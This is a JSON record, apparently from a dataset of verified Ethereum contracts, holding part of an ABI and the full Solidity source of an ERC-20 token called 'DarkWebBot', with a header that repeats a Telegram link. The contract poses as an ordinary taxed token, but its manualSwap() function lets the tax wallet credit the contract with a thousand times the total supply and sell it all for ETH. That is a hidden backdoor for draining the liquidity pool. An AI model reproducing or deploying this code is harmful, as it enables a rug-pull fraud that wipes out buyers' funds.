\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeMultipleAccountsFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"setFeeAddressWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"setMaxTxnAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxWalletSize\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletSize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_swapEnabled\",\"type\":\"bool\"}],\"name\":\"toggleSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelay\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\n/**\r\n\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\nhttps://t.me/DarkWebBott\r\n\r\n**/\r\npragma solidity 0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\ncontract DarkWebBot is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = unicode\"DarkWebBot\";\r\n    string private constant _symbol = unicode\"DarkWeb\";\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _isExcludedFromFee;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    bool public transferDelay = true;\r\n    address payable private _taxWallet;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 100000000000 * 10**_decimals;\r\n    uint256 public _maxTxAmount = 15000000000 * 10**_decimals;\r\n    uint256 public _maxWalletSize = 30000000000 * 10**_decimals;\r\n    uint256 public _maxTaxSwap = 1000000000 * 10**_decimals;\r\n\r\n    uint256 private BuyTax = 3;\r\n    uint256 private SellTax = 3;\r\n    uint256 private launchedAt;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint256 _maxTxAmount);\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor() {\r\n        _taxWallet = payable(_msgSender());\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxNum = 0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n\r\n            if (from == uniswapV2Pair && to == tx.origin) {\r\n                taxNum = amount.mul(BuyTax).div(100);\r\n            }\r\n\r\n\r\n            if (transferDelay) {\r\n                if (\r\n                    to != address(uniswapV2Router) &&\r\n                    to != address(uniswapV2Pair)\r\n                ) {\r\n                    require(\r\n                        _holderLastTransferTimestamp[tx.origin] < block.number,\r\n                        \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\"\r\n                    );\r\n                    _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == address(uniswapV2Pair) && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && launchedAt + 1 >= block.number) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n            }\r\n\r\n            if (to == uniswapV2Pair && from != address(this)) {\r\n                taxNum = amount.mul(SellTax).div(100);\r\n            }\r\n\r\n\r\n            if (!inSwap && to == uniswapV2Pair && swapEnabled) {\r\n                swapTokensForETH(\r\n                    min(amount, min(balanceOf(address(this)), _maxTaxSwap))\r\n                );\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance > 0) {\r\n                    transferETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (taxNum > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(taxNum);\r\n            emit Transfer(from, address(this), taxNum);\r\n        }\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount.sub(taxNum));\r\n        emit Transfer(from, to, amount.sub(taxNum));\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n        transferDelay = false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n   function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function transferETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return (a > b) ? b : a;\r\n    }\r\n\r\n    function openTrading() external onlyOwner {\r\n        require(!tradingOpen, \"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        IERC20(uniswapV2Pair).approve(\r\n            address(uniswapV2Router),\r\n            type(uint256).max\r\n        );\r\n        tradingOpen = true;\r\n        swapEnabled = true;\r\n        launchedAt = block.number;\r\n    }\r\n\r\n\r\n    function setFeeAddressWallet(address payable newWallet) external onlyOwner {\r\n        _taxWallet = newWallet;\r\n    }\r\n\r\n\r\n    function toggleSwap(bool _swapEnabled) public onlyOwner {\r\n        swapEnabled = _swapEnabled;\r\n    }\r\n \r\n \r\n    //Set max buy amount \r\n    function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {\r\n        _maxTxAmount = maxTxAmount;\r\n    }\r\n\r\n    //Set max wallet amount \r\n    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }\r\n\r\n    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {\r\n        for(uint256 i = 0; i < accounts.length; i++) {\r\n            _isExcludedFromFee[accounts[i]] = excluded;\r\n        }\r\n    }\r\n\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender() == _taxWallet);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*1000);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n\r\n        if (tokenBalance > 0) {\r\n            swapTokensForETH(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            transferETHToFee(ethBalance);\r\n        }\r\n    }\r\n}",
    "etherscan_verified": true
}